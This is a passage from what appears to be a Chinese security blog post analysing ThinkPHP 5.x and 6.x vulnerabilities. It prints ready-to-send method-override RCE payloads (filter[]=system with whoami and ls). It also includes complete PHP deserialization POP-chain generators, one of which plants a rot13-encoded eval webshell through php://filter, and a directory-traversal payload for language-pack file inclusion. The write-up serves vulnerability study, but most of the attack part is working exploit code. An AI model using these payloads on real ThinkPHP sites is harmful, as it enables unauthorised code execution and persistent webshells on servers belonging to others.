方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213226503.png" alt="image-20230705213226503"></p><p>跟进input</p><p> $data会被 filterValue 方法使用 $filter 过滤器处理。其中 $filter的值部分来自$this-&gt;filter ，又是可以通过先前Request 类的<code>__construct</code>方法来覆盖赋值。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213513687.png" alt="image-20230705213513687"></p><p>接下来就是 filterValue方法调用call_user_func处理数据的过程，代码执行就是发生在这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213543908.png" alt="image-20230705213543908"></p><p>所以再开启了Debug后的exp是：</p><pre><code>POST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705214402354.png" alt="image-20230705214402354"></p><p>还有许多调用链,而且不同版本会有所不同,原理都是一样的</p><pre><code># ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h4><h5 id="高版本（5-0-24）"><a href="#高版本（5-0-24）" class="headerlink" title="高版本（5.0.24）"></a>高版本（5.0.24）</h5><p>控制器</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp5.0.24&#39;;    &#125;&#125;</code></pre><p>反序列化第一步，先找<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706093127919.png" alt="image-20230706093127919"></p><p>这里使用的是<code>process/pipes/Windows.php的__destruct()</code>，它调用了自己的<code>removeFiles()</code>方法</p><p>查看这个方法</p><pre><code class="php">private function removeFiles()    &#123;        foreach ($this-&gt;files as $filename) &#123;            if (file_exists($filename)) &#123;                @unlink($filename);            &#125;        &#125;        $this-&gt;files = [];    &#125;</code></pre><p>这个$this-&gt;files是可以控制的，经过<code>file_exists($filename)</code>可以触发<code>__tostring()</code>，这里存在一个任意文删除</p><p>全局搜索__tostring()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706094845102.png" alt="image-20230706094845102"></p><p>这里选择的是Model.php里面的<code>__tostring</code>方法</p><p>跟进其调用的<code>toJson()</code></p><pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>继续跟进<code>$this-&gt;toArray()</code>,发现这里的可控参数比较多 （这部分有点懵逼）</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706100617880.png" alt="image-20230706100617880"></p><p>这里可以找到一个触发<code>__call</code>的地方</p><p>此时，需要控制<code>$value</code>为一个带有<code>__call</code>的类对象，往上查找，$value是来自这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706101439978.png" alt="image-20230706101439978"></p><p>其中，参数 <code>$modelRelation = $this-&gt;$relation()</code> ，实际上就是 <code>think\Model</code> 类任意方法的返回结果。这里选择返回结果简单可控的 <code>getError</code> 方法</p><pre><code class="php">public function getError()&#123;    return $this-&gt;error;&#125;</code></pre><p>在getRelationData方法里，要进入第一个if语句才能赋值成想要的类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706104144796.png" alt="image-20230706104144796"></p><p>层层分析，要满足</p><pre><code>$this-&gt;append = [&#39;getError&#39;];$this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()$this-&gt;selfRelation = false;//isSelfRelation()$this-&gt;query = new Query();$this-&gt;parent = new xxx()  //调用__call</code></pre><p>全局搜索__call</p><p>这里选择的是console&#x2F;Output.php的Output类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706105401777.png" alt="image-20230706105401777"></p><pre><code class="php">public function __call($method, $args)    &#123;        if (in_array($method, $this-&gt;styles)) &#123;            array_unshift($args, $method);            return call_user_func_array([$this, &#39;block&#39;], $args);        &#125;        if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;            return call_user_func_array([$this-&gt;handle, $method], $args);        &#125; else &#123;            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);        &#125;    &#125;</code></pre><p>这个方法调用了<code>call_user_func_array</code>把第一个参数作为回调函数（<strong>callback</strong>）调用，把参数数组作（<strong>param_arr</strong>）为回调函数的的参数传入</p><p>在第一个call_user_func_array中调用了block方法</p><pre><code class="php">protected function block($style, $message)    &#123;        $this-&gt;writeln(&quot;&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;&quot;);    &#125;</code></pre><p>继续跟进writeln</p><pre><code class="php">public function writeln($messages, $type = self::OUTPUT_NORMAL)    &#123;        $this-&gt;write($messages, true, $type);    &#125;</code></pre><p>继续跟进write</p><pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)&#123;    $this-&gt;handle-&gt;write($messages, $newline, $type);&#125;</code></pre><p>$this-&gt;handle可控，可以修改为某个类，执行这个类的write</p><p>全局搜索 <code>write</code> 方法进一步利用，跟进 <code>thinkphp/library/think/session/driver/Memcached.php</code></p><pre><code class="php">public function write($sessID, $sessData)&#123;    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);&#125;</code></pre><p>这个$this-&gt;handle也是可控的，</p><p>全局搜索<code>set</code>方法,找到<code>thinkphp/library/think/cache/driver/File.php</code></p><pre><code class="php">public function set($name, $value, $expire = null)    &#123;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#39;expire&#39;];        &#125;        if ($expire instanceof \DateTime) &#123;            $expire = $expire-&gt;getTimestamp() - time();        &#125;        $filename = $this-&gt;getCacheKey($name, true);        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;            $first = true;        &#125;        $data = serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result = file_put_contents($filename, $data);        if ($result) &#123;            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);            clearstatcache();            return true;        &#125; else &#123;            return false;        &#125;    &#125;</code></pre><p>这里存在一个php文件写入，虽然前面有<code>exit()</code>避免后面的数据被执行，但是这里可以使用伪协议绕过</p><p>这里存在一个问题，只能控制文件名，写入为文件的数据来自<code>$value</code>, 根据链子传参，$value&#x3D; true ，是不可控的</p><p>而且在windows环境下，文件名存在限制</p><p>往下存在setTagItem调用，传参是文件名</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706115302269.png" alt="image-20230706115302269"></p><p>跟进查看：</p><pre><code class="php">protected function setTagItem($name)    &#123;        if ($this-&gt;tag) &#123;            $key       = &#39;tag_&#39; . md5($this-&gt;tag);            $this-&gt;tag = null;            if ($this-&gt;has($key)) &#123;                $value   = explode(&#39;,&#39;, $this-&gt;get($key));                $value[] = $name;                $value   = implode(&#39;,&#39;, array_unique($value));            &#125; else &#123;                $value = $name;            &#125;            $this-&gt;set($key, $value, 0);        &#125;    &#125;</code></pre><p>这个函数会再次调用set()方法，并且set方法的value是来自文件名$name,也就是说可以把前面的文件名写入到文件里</p><p>如果第一次调用set方法的时候把恶意代码写到文件名里，第二此调用set的时候就能够把文件名的内容写入到新的php文件里</p><p>最终POP链：</p><pre><code class="php">&lt;?phpnamespace think\process\pipes;use think\model\Pivot;class Pipes&#123;&#125;class Windows extends Pipes&#123;    private $files = [];    function __construct()&#123;        $this-&gt;files = [new Pivot()];    &#125;&#125;namespace think\model;#Relationuse think\db\Query;abstract class Relation&#123;    protected $selfRelation;    protected $query;    function __construct()&#123;        $this-&gt;selfRelation = false;        $this-&gt;query = new Query();#class Query    &#125;&#125;namespace think\model\relation;#OneToOne HasOneuse think\model\Relation;abstract class OneToOne extends Relation&#123;    function __construct()&#123;        parent::__construct();    &#125;&#125;class HasOne extends OneToOne&#123;    protected $bindAttr = [];    function __construct()&#123;        parent::__construct();        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];    &#125;&#125;namespace think\console;#Outputuse think\session\driver\Memcached;class Output&#123;    private $handle = null;    protected $styles = [];    function __construct()&#123;        $this-&gt;handle = new Memcached();//目的调用其write()        $this-&gt;styles = [&#39;getAttr&#39;];    &#125;&#125;namespace think;#Modeluse think\model\relation\HasOne;use think\console\Output;use think\db\Query;abstract class Model&#123;    protected $append = [];    protected $error;    public $parent;#修改处    protected $selfRelation;    protected $query;    protected $aaaaa;    function __construct()&#123;        $this-&gt;parent = new Output();#Output对象,目的是调用__call()        $this-&gt;append = [&#39;getError&#39;];        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()        $this-&gt;selfRelation = false;//isSelfRelation()        $this-&gt;query = new Query();    &#125;&#125;namespace think\db;#Queryuse think\console\Output;class Query&#123;    protected $model;    function __construct()&#123;        $this-&gt;model = new Output();    &#125;&#125;namespace think\session\driver;#Memcacheduse think\cache\driver\File;class Memcached&#123;    protected $handler = null;    function __construct()&#123;        $this-&gt;handler = new File();//目的调用File-&gt;set()    &#125;&#125;namespace think\cache\driver;#Fileclass File&#123;    protected $options = [];    protected $tag;    function __construct()&#123;        $this-&gt;options = [            &#39;expire&#39;        =&gt; 0,            &#39;cache_subdir&#39;  =&gt; false,            &#39;prefix&#39;        =&gt; &#39;&#39;,            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,            &#39;data_compress&#39; =&gt; false,        ];        $this-&gt;tag = true;    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><h5 id="低版本-（5-0-3）"><a href="#低版本-（5-0-3）" class="headerlink" title="低版本 （5.0.3）"></a>低版本 （5.0.3）</h5><p>控制器</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp&#39;;    &#125;&#125;</code></pre><p>因为低版本的toArray()函数和高版本的有所不同，不存在调用__call()的条件，所以需要重新找一条链子</p><p>从<code>__destruct</code>开始找,除了<code>process/pipes/Windows.php</code>外还有3个可以选,但是只有一条是可利用的   <code>Process.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706144327242.png" alt="image-20230706144327242"></p><p>这里调用了<code>stop()</code>方法,跟进查看</p><pre><code class="php">public function stop()    &#123;        if ($this-&gt;isRunning()) &#123;            if (&#39;\\&#39; === DS &amp;&amp; !$this-&gt;isSigchildEnabled()) &#123;                exec(sprintf(&#39;taskkill /F /T /PID %d 2&gt;&amp;1&#39;, $this-&gt;getPid()), $output, $exitCode);                if ($exitCode &gt; 0) &#123;                    throw new \RuntimeException(&#39;Unable to kill the process&#39;);                &#125;            &#125; else &#123;                $pids = preg_split(&#39;/\s+/&#39;, `ps -o pid --no-heading --ppid &#123;$this-&gt;getPid()&#125;`);                foreach ($pids as $pid) &#123;                    if (is_numeric($pid)) &#123;                        posix_kill($pid, 9);                    &#125;                &#125;            &#125;        &#125;        $this-&gt;updateStatus(false);        if ($this-&gt;processInformation[&#39;running&#39;]) &#123;            $this-&gt;close();        &#125;        return $this-&gt;exitcode;    &#125;</code></pre><p>跟进<code>isRunning()</code></p><pre><code class="php">public function isRunning()    &#123;        if (self::STATUS_STARTED !== $this-&gt;status) &#123;            return false;        &#125;        $this-&gt;updateStatus(false);        return $this-&gt;processInformation[&#39;running&#39;];    &#125;</code></pre><p>里面会调用一个updateStatus方法，并且$this-&gt;status可控，可以让程序走到这</p><p>跟进查看</p><pre><code class="php">    protected function updateStatus($blocking)    &#123;        if (self::STATUS_STARTED !== $this-&gt;status) &#123;            return;        &#125;        $this-&gt;processInformation = proc_get_status($this-&gt;process);        $this-&gt;captureExitCode();        $this-&gt;readPipes($blocking, &#39;\\&#39; === DS ? !$this-&gt;processInformation[&#39;running&#39;] : true);        if (!$this-&gt;processInformation[&#39;running&#39;]) &#123;            $this-&gt;close();        &#125;    &#125;</code></pre><p>后面的$this-&gt;close()是可以利用的，第一行就可以触发__call</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150633080.png" alt="image-20230706150633080"></p><p>但是程序走不到这里，当运行<code>proc_get_status</code>的时候就会报错退出了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150555278.png" alt="image-20230706150555278"></p><p>这里的close()是不能利用了</p><p>在上面的 stop()方法中，后面就自带了 <code>close（）</code>,利用这个就行,只需：</p><pre><code class="php">$this-&gt;processInformation[&#39;running&#39;]=true;$this-&gt;status=3;//只有不相等就行</code></pre><p>跟进<code>close()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706152017394.png" alt="image-20230706152017394"></p><p>这里触发__call(),需要控制<code>$this-&gt;processPipes</code></p><p>尝试直接触发think\console\Output类中的__call魔术方法。由于block方法需要2个参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706153015240.png" alt="image-20230706153015240"></p><p>需要找到另外一个__call方法</p><p>最终找到<code>model/Relation.php</code>这个文件下的__call</p><pre><code class="php">public function __call($method, $args)    &#123;        if ($this-&gt;query) &#123;            switch ($this-&gt;type) &#123;                case self::HAS_MANY:                    if (isset($this-&gt;where)) &#123;                        $this-&gt;query-&gt;where($this-&gt;where);                    &#125; elseif (isset($this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;)) &#123;                        // 关联查询带入关联条件                        $this-&gt;query-&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);                    &#125;                    break;                case self::HAS_MANY_THROUGH:                    $through      = $this-&gt;middle;                    $model        = $this-&gt;model;                    $alias        = Loader::parseName(basename(str_replace(&#39;\\&#39;, &#39;/&#39;, $model)));                    $throughTable = $through::getTable();                    $pk           = (new $this-&gt;model)-&gt;getPk();                    $throughKey   = $this-&gt;throughKey;                    $modelTable   = $this-&gt;parent-&gt;getTable();                    $this-&gt;query-&gt;field($alias . &#39;.*&#39;)-&gt;alias($alias)                        -&gt;join($throughTable, $throughTable . &#39;.&#39; . $pk . &#39;=&#39; . $alias . &#39;.&#39; . $throughKey)                        -&gt;join($modelTable, $modelTable . &#39;.&#39; . $this-&gt;localKey . &#39;=&#39; . $throughTable . &#39;.&#39; . $this-&gt;foreignKey)                        -&gt;where($throughTable . &#39;.&#39; . $this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);                    break;                case self::BELONGS_TO_MANY:                    // TODO            &#125;            $result = call_user_func_array([$this-&gt;query, $method], $args);            if ($result instanceof \think\db\Query) &#123;                $this-&gt;option = $result-&gt;getOptions();                return $this;            &#125; else &#123;                $this-&gt;option = [];                return $result;            &#125;        &#125; else &#123;            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);        &#125;    &#125;</code></pre><p>这个__call就非常的好用，query和type和where都可以控制</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706155221160.png" alt="image-20230706155221160"></p><p>这里就可以构造，调用上面Output类的__call()方法了</p><pre><code class="php">class Relation&#123;    protected $query;    const HAS_ONE          = 1;    const HAS_MANY         = 2;    const HAS_MANY_THROUGH = 5;    const BELONGS_TO       = 3;    const BELONGS_TO_MANY  = 4;    protected $type=2;    protected $where=1;    public function __construct()    &#123;        $this-&gt;query=new Output();    &#125;&#125;</code></pre><p>跟进<code>Output</code>中的<code>__call</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706163554437.png" alt="image-20230706163554437"></p><p>进行跟进</p><pre><code>__call--&gt;block--&gt;writeln--&gt;write--&gt;</code></pre><pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)    &#123;        $this-&gt;handle-&gt;write($messages, $newline, $type);    &#125;</code></pre><p>通过这里可以调用任意类的write方法，</p><p>这里找到两个一样的，都调用了set方法</p><pre><code class="php">//session/driver/Memcache.phppublic function write($sessID, $sessData)    &#123;        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, 0, $this-&gt;config[&#39;expire&#39;]);    &#125;</code></pre><pre><code class="php">//session/driver/Memcached.phppublic function write($sessID, $sessData)    &#123;        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);    &#125;</code></pre><p>最后选择了<code>session/driver/Memcached.php</code></p><p>全局搜索set方法，和高版本的一样，使用cache&#x2F;driver&#x2F;File.php这里的set,</p><p>后面的操作是和高版本的相同的，调用了两次set方法，然后第二次调用的时候吧恶意代码存进php文件里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706171130685.png" alt="image-20230706171130685"></p><p>注意：因为windows对文件名存在限制，这个pop链只能在linux环境使用</p><pre><code class="php">&lt;?phpnamespace think;class Process&#123;    private $processPipes;    private $status;    private $processInformation;    public function  __construct()&#123;        $this-&gt;processInformation[&#39;running&#39;]=true;        $this-&gt;status=3;        $this-&gt;processPipes=new \think\model\Relation();    &#125;&#125;namespace think\model;use think\console\Output;class Relation&#123;    protected $query;    const HAS_ONE          = 1;    const HAS_MANY         = 2;    const HAS_MANY_THROUGH = 5;    const BELONGS_TO       = 3;    const BELONGS_TO_MANY  = 4;    protected $type=2;    protected $where=1;    public function __construct()    &#123;        $this-&gt;query=new Output();    &#125;&#125;namespace think\console;use think\session\driver\Memcached;class Output&#123;    protected $styles = [        &#39;info&#39;,        &#39;error&#39;,        &#39;comment&#39;,        &#39;question&#39;,        &#39;highlight&#39;,        &#39;warning&#39;,        &#39;getTable&#39;,        &#39;where&#39;    ];    private $handle;    public function __construct()    &#123;//        $this-&gt;handle = (new \think\session\driver\Memcache);        $this-&gt;handle = new Memcached();//目的调用其write()//        $this-&gt;styles = [&#39;getAttr&#39;];    &#125;&#125;namespace think\session\driver;#Memcacheduse think\cache\driver\File;class Memcached&#123;    protected $tag;    protected $handler;    public function __construct()    &#123;        $this-&gt;tag = true;           $this-&gt;handler = (new File);    &#125;&#125;namespace think\cache\driver;use think\cache\Driver;class File extends Driver&#123;    protected $tag;    protected $options;    public function __construct()    &#123;        $this-&gt;tag = false;        $this-&gt;options = [            &#39;expire&#39;        =&gt; 0,            &#39;cache_subdir&#39;  =&gt; false,            &#39;prefix&#39;        =&gt; &#39;&#39;,            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,            &#39;data_compress&#39; =&gt; false,        ];        $this-&gt;tag = true;    &#125;&#125;namespace think\cache;abstract class Driver&#123;&#125;use think\Process;$a=new Process();echo urlencode(serialize($a));</code></pre><h4 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h4><p>5.1.30</p><pre><code class="php">public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp&#39;;    &#125;</code></pre><p>全局搜索__destruct ， 这里使用的是think&#x2F;process&#x2F;pipes&#x2F;Windows.php的</p><pre><code class="php">public function __destruct()    &#123;        $this-&gt;close();        $this-&gt;removeFiles();    &#125;</code></pre><p>跟进<code>removeFiles()</code></p><pre><code class="php">private function removeFiles()    &#123;        foreach ($this-&gt;files as $filename) &#123;            if (file_exists($filename)) &#123;                @unlink($filename);            &#125;        &#125;        $this-&gt;files = [];    &#125;</code></pre><p>这里存在一个任意文删除，因为$this-&gt;files可控，还可以触发<code>__toString</code></p><p>全局搜索<code>__toString</code> </p><p>存在13个结果，但是这里使用的是<code>think/model/concern/Conversion.php</code>的<code>__toString </code>方法</p><pre><code class="php">public function __toString()    &#123;        return $this-&gt;toJson();    &#125;</code></pre><p>到这里先构造部分POP链</p><pre><code class="php">namespace think\process\pipes;use think\model\concern\Conversion;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[xxx];//    &#125;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><p>这里的xxx是只向<code>Conversion.php</code>的<code>__toString </code>方法所在的类<code>Conversion</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194702593.png" alt="image-20230706194702593"></p><p>由于<code>convertion</code>是<code>trait</code>类，Trait是一种代码复用机制，它允许在不同类之间共享方法的代码块</p><p>所以只要找到一个使用了conversion的类即可，全局搜索conversion只找到Model类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194922743.png" alt="image-20230706194922743"></p><p>由于Model是抽象类，我们得找到<code>Model</code>的实现类，全局搜索<code>extends Model</code>找到<code>Pivot</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706195420277.png" alt="image-20230706195420277"></p><p>所以exp要这样写</p><pre><code class="php">namespace think\process\pipes;abstract class Pipes&#123;&#125;namespace think\process\pipes;use think\model\Pivot;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think;abstract class Model&#123;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><p>回到<code>__toString</code>跟进这个<code>toJson()</code>方法</p><pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>跟进<code>toArray()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706204511419.png" alt="image-20230706204511419"></p><p>在这里可以看到有许多参数都是可控的，例如$this-&gt;data，$this-&gt;relation，$this-&gt;visible，$this-&gt;append</p><p>这里能够使用的是<code>getAttr()</code>方法</p><p>先查看这个方法：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211615736.png" alt="image-20230706211615736"></p><p>这个$closure是可控的，可以用来调用任意函数，其参数$value,是由上一层传来的参数控制，也可控</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211900803.png" alt="image-20230706211900803"></p><p>这个$key来自<code>$this-&gt;data</code>,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706212008652.png" alt="image-20230706212008652"></p><p>所以只是需要如下构造，即可实现system(‘calc’)</p><pre><code class="php">protected $append = [&#39;a&#39;=&gt;[]];    private $withAttr = [];    private $data = [];    public function __construct($data = [])    &#123;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;</code></pre><p>最终的调用栈</p><pre><code>Attribute.php:511, think\Model-&gt;getAttr()Conversion.php:161, think\Model-&gt;toArray()Conversion.php:209, think\Model-&gt;toJson()Conversion.php:225, think\Model-&gt;__toString()Windows.php:163, file_exists()Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()Windows.php:59, think\process\pipes\Windows-&gt;__destruct()Container.php:395, app\index\controller\Index-&gt;index()Container.php:395, ReflectionMethod-&gt;invokeArgs()Container.php:395, think\Container-&gt;invokeReflectMethod()Module.php:135, think\route\dispatch\Module-&gt;think\route\dispatch\&#123;closure&#125;()Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()Middleware.php:130, think\Middleware-&gt;dispatch()Module.php:140, think\route\dispatch\Module-&gt;exec()Dispatch.php:168, think\route\Dispatch-&gt;run()App.php:432, think\App-&gt;think\&#123;closure&#125;()Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()Middleware.php:130, think\Middleware-&gt;dispatch()App.php:435, think\App-&gt;run()index.php:21, &#123;main&#125;()</code></pre><p>POP链</p><pre><code class="php">&lt;?phpnamespace think\process\pipes;abstract class Pipes&#123;&#125;namespace think\process\pipes;use think\model\Pivot;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think;abstract class Model&#123;    protected $append = [&#39;a&#39;=&gt;[]];    private $withAttr = [];    private $data = [];    public function __construct($data = [])    &#123;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><h4 id="5-2-x"><a href="#5-2-x" class="headerlink" title="5.2.x"></a>5.2.x</h4><p>(无测试环境，暂时PASS)</p><h2 id="ThinkPHP-6-x"><a href="#ThinkPHP-6-x" class="headerlink" title="ThinkPHP 6.x"></a>ThinkPHP 6.x</h2><h3 id="任意php文件包含-6-0-1-6-0-13，5-0-x，5-1-x"><a href="#任意php文件包含-6-0-1-6-0-13，5-0-x，5-1-x" class="headerlink" title="任意php文件包含(6.0.1~6.0.13，5.0.x，5.1.x)"></a>任意php文件包含(6.0.1~6.0.13，5.0.x，5.1.x)</h3><p>漏洞描述：</p><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含</p><p>和6.0.14版本比较，发现官方删除了Lang.php的detect函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708190607220.png" alt="image-20230708190607220"></p><p>LoadLangPack.php的detect函数也有修改</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708190749712.png" alt="image-20230708190749712"></p><p>分析这个detect()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708191822492.png" alt="image-20230708191822492"></p><p>这个函数首先是从http请求中的三个地方获取数据，然后转成小写字母保存到$langSet中</p><p>然后如果满足if条件，就将<code>$langSet</code>保存到range中返回</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708192423332.png" alt="image-20230708192423332"></p><p>全局查找detect()的引用，找到了Lang.php的handle函数，正是加载语言包的地方</p><p>查看handle()</p><pre><code class="php">public function handle($request, Closure $next)    &#123;        // 自动侦测当前语言        $langset = $this-&gt;lang-&gt;detect($request);        if ($this-&gt;lang-&gt;defaultLangSet() != $langset) &#123;            // 加载系统语言包            $this-&gt;lang-&gt;load([                $this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;,            ]);            $this-&gt;app-&gt;LoadLangPack($langset);        &#125;        $this-&gt;lang-&gt;saveToCookie($this-&gt;app-&gt;cookie);        return $next($request);    &#125;</code></pre><p>在函数第一条代码中，就调用了，detect()方法</p><p>环境搭建</p><p>搭建环境，传参调试一下：</p><p>开启开启多语言功能：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194806182.png" alt="image-20230708194806182"></p><pre><code>http://127.0.0.1/?lang=../../../../../public/test</code></pre><p>在handle函数下断点</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708192934742.png" alt="image-20230708192934742"></p><p>跟进detect()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708193017298.png" alt="image-20230708193017298"></p><p>这里从get方法中获取值，保存到了langSet</p><p>往下，因为默认情况下allow_lang_list是空的，进入if语句</p><p><img src="C:\Users\Tree\AppData\Roaming\Typora\typora-user-images\image-20230708193130198.png" alt="image-20230708193130198"></p><p><img src="C:\Users\Tree\AppData\Roaming\Typora\typora-user-images\image-20230708193216162.png" alt="image-20230708193216162"></p><p>返会handle()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708193317784.png" alt="image-20230708193317784"></p><p>然后加载语言包</p><p>这里出现一个目录拼接，<code>$this-&gt;app-&gt;getThinkPath()</code>是获取TP核心框架目录，</p><p>拼接结果：</p><pre><code class="php">...\topthink\framework\src\lang\../../../../../public/test.php</code></pre><p>最终会加载public目录下的test.php</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194435061.png" alt="image-20230708194435061"></p><p>结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194532880.png" alt="image-20230708194532880"></p><h3 id="任意文件写（6-0-0，6-0-1）"><a href="#任意文件写（6-0-0，6-0-1）" class="headerlink" title="任意文件写（6.0.0，6.0.1）"></a>任意文件写（6.0.0，6.0.1）</h3><p>环境：tp6.0.1</p><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123;    public function index()    